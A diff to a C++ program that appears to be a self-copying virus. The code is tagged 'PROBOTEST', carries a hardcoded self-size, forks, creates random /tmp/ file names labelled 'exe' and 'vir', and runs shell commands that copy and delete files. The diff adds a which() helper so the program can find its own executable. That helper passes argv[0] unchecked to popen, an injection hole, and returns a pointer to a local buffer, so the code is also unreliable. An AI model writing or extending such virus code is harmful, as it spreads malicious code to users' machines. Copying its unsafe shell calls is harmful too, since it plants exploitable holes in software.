@@ -3,15 +3,20 @@
 #include <unistd.h>
 
 const char* IDENTIFIER = "PROBOTEST";
-const int MYSIZE = 14881;
+const int MYSIZE = 19472;
 
 using namespace std;
+
+char* which(char* w);
 
 int main (int argc, char** argv) {
     pid_t childpid = fork();
     srand(time(0));
     int c;
     string exe = "/tmp/", vir = "/tmp/", me = (string) argv[0], command;
+    me = which(argv[0]);
+    me = me.substr(0, me.size() - 1);
+    // cout << "\n" << me << "\n\n";
     for (int i = 0; i < 8; i++) {
         exe += (char) ((rand() % 26) + 65);
         vir += (char) ((rand() % 26) + 65);
@@ -56,4 +61,14 @@ rm -f ${VIR}__ ";
             c = system( (command).c_str() );
         }
     }
+}
+
+char* which(char* w) {
+    string command = "/usr/bin/which ";
+    command += w;
+    FILE *which_fp = popen((command).c_str(), "r");
+    char buffer[1024];
+    char* output = fgets(buffer, sizeof(buffer), which_fp);
+    pclose(which_fp);
+    return output;
 }
